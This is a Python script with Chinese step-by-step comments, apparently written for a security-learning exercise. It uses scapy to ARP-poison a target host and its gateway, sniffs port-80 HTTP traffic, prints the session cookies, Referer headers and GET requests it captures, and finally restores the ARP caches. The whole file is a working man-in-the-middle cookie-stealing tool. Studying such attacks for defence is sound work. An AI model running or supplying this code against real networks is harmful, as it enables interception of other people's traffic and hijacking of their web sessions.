# 1. 从命令行获取要欺骗的IP
# 2. 获取IP对应的MAC地址
# 3. 定义MAC获取函数get_mac()
# 4. 启动ARP欺骗
# 5. 定义ARP欺骗函数
# 6. 嗅探数据包
# 7. 定义cookie嗅探函数
# 8. 恢复靶机ARP缓存
# 9. 定义ARP缓存恢复函数

from scapy.all import *
import time
from threading import Thread


def main(target_ip, gateway_ip):
    conf.verb = 0
    # 2. 获取IP对应的MAC地址
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # 4. 启动ARP欺骗
    t = Thread(target=poison_target, args=(target_ip, target_mac, gateway_ip, gateway_mac))
    # 当主线程结束时，子线程自动结束
    t.setDaemon(True)
    t.start()

    # 6. 嗅探数据包
    sniff(filter="tcp port 80", prn=packet_callback, store=0)

    # 8. 恢复靶机ARP缓存
    restore_target(target_ip, target_mac, gateway_ip, gateway_mac)


# 9. 定义ARP缓存恢复函数
def restore_target(target_ip, target_mac, gateway_ip, gateway_mac):
    print("[*] Restoring target...")
    # 恢复靶机的缓存
    send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

    # 恢复目标机缓存
    send(ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)


# 7. 定义cookie嗅探函数
def packet_callback(packet):
    if packet[TCP].payload:
        cookie_packet = bytes(packet[TCP].payload)
        if b"Cookie" in cookie_packet:
            for info in cookie_packet.split(b'\n'):
                if b"Referer" in info or b"GET /" in info:
                    print(info)
                elif b"Cookie" in info:
                    print(info, "\n")


# 5. 定义ARP欺骗函数
def poison_target(target_ip, target_mac, gateway_ip, gateway_mac):
    # 欺骗靶机
    target = ARP()
    target.op = 2  # 2 代表响应包
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = target_mac

    # 欺骗网关
    gateway = ARP()
    gateway.op = 2
    gateway.psrc = target_ip
    gateway.pdst = gateway_ip
    gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison...")
    while True:
        send(target)
        send(gateway)
        time.sleep(2)


# 3. 定义MAC获取函数get_mac()
def get_mac(ip):
    response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2)
    for s, r in response:
        return r[ARP].hwsrc


if __name__ == "__main__":
    # 1. 从命令行获取要欺骗的IP
    target_ip = input("Input target IP: ")
    gateway_ip = input("Input gateway IP: ")
    main(target_ip, gateway_ip)
